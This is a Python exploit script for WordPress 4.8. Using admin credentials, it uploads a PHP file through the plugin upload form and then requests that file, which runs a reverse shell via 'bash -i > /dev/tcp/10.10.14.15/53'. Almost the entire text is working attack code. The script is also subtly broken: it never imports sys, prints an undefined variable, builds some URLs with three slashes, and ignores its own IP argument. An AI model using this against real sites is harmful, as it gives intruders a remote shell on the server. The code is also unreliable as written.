#wp 4.8 upload plugin rce
import datetime
import requests
from bs4 import BeautifulSoup

now=datetime.datetime.now()
year = '{:02d}'.format(now.year)
month = '{:02d}'.format(now.month)

if len(sys.argv) < 5:
	print("(+) usage: %s <target> user:pass <your_ip> <your_port>" % sys.argv[0])
	sys.exit(-1)

target = sys.argv[1]
yourip=sys.argv[3]
yourPORT=sys.argv[4]


try:
    user   = sys.argv[2].split(":")[0]
    pswd   = sys.argv[2].split(":")[1]
except:
    print("(-) username and password needs to be in the format \"user:pass\"")
    sys.exit(-1)

s=requests.session()

proxies = { 'http':'http://127.0.0.1:8080'}

headers={
	'Cookie':'wordpress_test_cookie=WP Cookie check'
}
data={
	'log':user,
	'pwd':pswd,
	'wp-submit':"Log in",
	'redirect_to':"http://"+target+"/wp-admin/",
	'testcookie':"1"
}
r=s.post("http://"+target+"/wp-login.php" ,headers=headers, data=data, allow_redirects=True)
#r=s.post("http://"+target+"/wp-login.php" ,headers=headers, data=data, allow_redirects=True, proxies=proxies) proxies

#get _wpnonce value
soup = BeautifulSoup(r.content, 'html.parser')
#print(soup.prettify())
input_tag = soup.find_all(id="_wpnonce")
wpnonce = input_tag[0]['value']
#print(wpnonce)

headers= { 'Content-Type': 'multipart/form-data; boundary=---------------------------11190208571075685469434943864'}

data = 	"\r\n-----------------------------11190208571075685469434943864\r\nContent-Disposition: form-data; name=\"_wpnonce\"\r\n\r\n"+ wpnonce+ "" \
	"\r\n-----------------------------11190208571075685469434943864\r\nContent-Disposition: form-data; name=\"_wp_http_referer\"\r\n\r\n/wp-admin/plugin-install.php" \
	"\r\n-----------------------------11190208571075685469434943864\r\nContent-Disposition: form-data; name=\"pluginzip\"; filename=\"brce.php5\"\r\nContent-Type: application/x-php\r\n\r\n<?php exec(\"/bin/bash -c 'bash -i > /dev/tcp/10.10.14.15/53 0>&1'\");" \
	"\r\n-----------------------------11190208571075685469434943864\r\nContent-Disposition: form-data; name=\"install-plugin-submit\"\r\n\r\n\"Install Now\"" \
	"\r\n-----------------------------11190208571075685469434943864--\r\n"
	
#r=s.post("http:///"+target+"wp-admin/update.php?action=upload-plugin", headers=headers, data=data,proxies=proxies) proxies
r=s.post("http:///"+target+"wp-admin/update.php?action=upload-plugin", headers=headers, data=data)

print("set nc on port "+port+"")
r=s.post("http://"+target+"/wp-content/uploads/"+year+"/"+month+"/brce.php5")
